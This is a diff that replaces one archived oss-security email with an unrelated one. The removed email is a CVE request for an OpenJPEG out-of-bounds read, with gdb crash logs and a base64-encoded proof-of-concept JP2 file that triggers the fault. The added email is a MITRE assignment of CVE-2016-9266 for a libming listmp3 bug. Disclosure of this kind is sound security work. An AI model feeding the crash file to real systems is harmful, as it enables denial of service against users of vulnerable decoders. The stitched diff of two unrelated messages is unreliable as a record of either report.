@@ -1,134 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/03/14/12
-Message-ID: <1F2D4DA31CA62740BFF46830A0E6A4F7064F6983@EXMBX-TJ002.tencent.com>
-Date: Mon, 14 Mar 2016 06:51:56 +0000
-From: winsonliu(刘科) <winsonliu@...cent.com>
-To: oss-security <oss-security@...ts.openwall.com>
-Subject: CVE request - OpenJPEG : Out-Of-Bounds Read in opj_tcd_free_tile function
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/11/10/11
+Message-ID: <e27fe29d768b4d2787b24e8c35e19913@imshyb02.MITRE.ORG>
+Date: Thu, 10 Nov 2016 12:31:08 -0500
+From: <cve-assign@...re.org>
+To: <ago@...too.org>
+CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>
+Subject: Re: libming: listmp3: left shift in listmp3.c
 Content-Type: text/plain; charset=utf-8
 
-Hi all,
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-I find a vulnerability of OpenJPEG. The specific flaw exists within the opj_tcd_free_tile function. A specially crafted JPEG2000 image file can force Out-Of-Bounds Read occurring in OpenJPEG. This issue can be reproduced in the latest version of OpenJPEG (https://github.com/uclouvain/openjpeg 2016.03.14).
+> https://blogs.gentoo.org/ago/2016/11/09/libming-listmp3-left-shift-in-listmp3-c
+> 
+> if you have a web application that calls directly the
+> listmp3 binary to parse untrusted mp3, then you are affected.
+> 
+> listmp3.c:94:23: runtime error: left shift of negative value -1
+> listmp3.c:95:23: runtime error: left shift of negative value -1
 
-The detailed information about this issue can be described as follows.
----------------------------------
-winson@...ntu:~/Desktop/repo/openjpeg/bin$ gdb opj_decompress -q
-Reading symbols from opj_decompress...(no debugging symbols found)...done.
+Use CVE-2016-9266.
 
-(gdb) r -o image.pgm -i opj_tcd_free_tile.jp2 
-Starting program: /home/winson/Desktop/repo/openjpeg/bin/opj_decompress -o image.pgm -i oob_opj_tcd_free_tile.jp2
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-[INFO] Start to read j2k main header (131).
-[INFO] Main header has been correctly decoded.
-[INFO] No decoded area parameters, set the decoded area to the whole image
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No incltree created.
-[WARNING] tgt_create tree->numnodes == 0, no tree created.
-[WARNING] No imsbtree created.
-[INFO] Header of tile 1 / 1 has been read.
-[INFO] Tile 1/1 has been decoded.
-[INFO] Image data has been updated with tile 1.
-
-[INFO] Stream reached its end !
-/home/winson/Desktop/repo/openjpeg/src/bin/jp2/convert.c:1765:imagetopnm
-precision 31 is larger than 16
-: refused.
-[ERROR] Outfile image.pgm not generated
-
-Program received signal SIGSEGV, Segmentation fault.
-0xb7fc61ae in opj_tcd_free_tile () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
-
-(gdb) bt
-#0  0xb7fc61ae in opj_tcd_free_tile () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
-#1  0xb7fc3ffa in opj_tcd_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
-#2  0xb7fa6cea in opj_j2k_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
-#3  0xb7fb4b38 in opj_jp2_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
-#4  0xb7fb74ac in opj_destroy_codec () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7
-#5  0x0804ca82 in main ()
-
-(gdb) x /i $eip
-=> 0xb7fc61ae <opj_tcd_free_tile+288>: mov    0x20(%eax),%eax
-(gdb) i r
-eax            0x40f72d11 1089940753
-ecx            0x30 48
-edx            0x362e88c5 909019333
-ebx            0xb7fd6000 -1208131584
-esp            0xbfff9e80 0xbfff9e80
-ebp            0xbfff9ec8 0xbfff9ec8
-esi            0x0 0
-edi            0x0 0
-eip            0xb7fc61ae 0xb7fc61ae <opj_tcd_free_tile+288>
-eflags         0x10293 [ CF AF SF IF RF ]
-cs             0x73 115
-ss             0x7b 123
-ds             0x7b 123
-es             0x7b 123
-fs             0x0 0
-gs             0x33 51
-
-(gdb) x /40xb $eax
-0x40f72d11: Cannot access memory at address 0x40f72d11
-
-(gdb) x /40xb $eax-0x20
-0x40f72cf1: Cannot access memory at address 0x40f72cf1
-
-
-The attachment is the proof-of-concept file.
-Alternatively, you can decode the following string using base64 and save the decoded content to a .jp2 file.
----------------------------------
-AAAADGpQICANCocKAAAAFGZ0eXBqcDIgAAAAAGpwMiAAAABbanAyaAAAABZpaGRyAAAAIAAAACAA
-BP8HAAAAAAAMYnBjYwQEBAAAAAAPY29scgEAAAAAABgAAAAiY2RlZgAEAAAAAAACAAEAAAADAAIA
-AAADAAMAAQAAAAABI2pwMmP/T/9RADIAAAAAACAAAAAgAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAA
-AAQECxWeAQEEAQEAAQH/UgAMAAAAAQEFBAQAAf9cABNAKDAwODAwODAwODAwODAwOP9kACUAAUNy
-ZWF0ZWQgYnkgT3BlbkpQRUcgdmVyc2lvbiAyLjEuMP+QAAoAAAAAAJkAAf+TwQgDz4AQCcOBA4Ch
-8AIEp8YIBr+vpBAJ18hAA6PjCAOXpU+vpCALHlIPoeDACzrXgKPkCgDP1Tx/p84cA3/dRtwif6fO
-HAN/3VDyfH+AofCKPmKiqS6j5BI9pjRZ2Z4Nooaj4xA9pjRZ2Z4Nv4Cg6MCdlqj4G1+h8I6drClA
-9VfWofCMnawpQPlngP/Z
-
-
-CREDIT:
-This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.
-
-
-Download attachment "oob_opj_tcd_free_tile.jp2" of type "application/octet-stream" (414 bytes)
+iQIcBAEBCAAGBQJYJK07AAoJEHb/MwWLVhi2xnIP/iMrmWEcLGxqkTjHbe/42kYD
+VyEq/lC0HbGi+5xvI5qLcC3AhmUC4WnpkyzNzOMh+fynNiojxM6qjWVsPHx5oWqd
+pUPBjGgZ08zdprhG9ovk5WE8+05ndCwSr47XJyyyJh6e3rUE4Le8wFs7AP7Qi0Lf
+7zOkVw1d8fAYYFg1UKToNilbuLFYwJmbEIjVZorhjH/8GJxhYqIk5HWWfBHGNyD7
+Huxvr9SXciyqhVKy+wOlSx9CU/M61iCXl4F+3cbnqX4xfFwoDUTRmbtHBJYXRBX4
+F2o2Ouh7Xvl5dBR4d9QN6s9Lw3hAY28Mz5E74h9u2QqzuRbNnArKfUe5npTYM3V0
+FSFZcv3e00Nojvsb1HvwVbpWnrGqv+ki9GbXAioBxJtuYWCV5MEguhq898nTRo1q
+WI2ZuyE7xapCEWYygz/W7Lc4UuIEHrZC7NvQs6IaICbGSbcbfl3/kwe14Z02K5fL
+AAteRtSd5DG97hZ6xhIdZhySxTXfa7mwmtaZpdKIYt1hKlwubDAtyrBDyFEle+mj
+AEUM/ynACAT3JMlR3KmFSdShluKbqo2s/DpsaA3SiXKNKbj5DLTo9U530AmvIQPq
+0qYTDeeb7p2POFf/nJg3RiUgPnLUl44lNskI5xyZVwmlLfi1a7hLaKQ1rUzXYZqR
+j+6hvOFIw29NRzOZWo6o
+=/BbH
+-----END PGP SIGNATURE-----
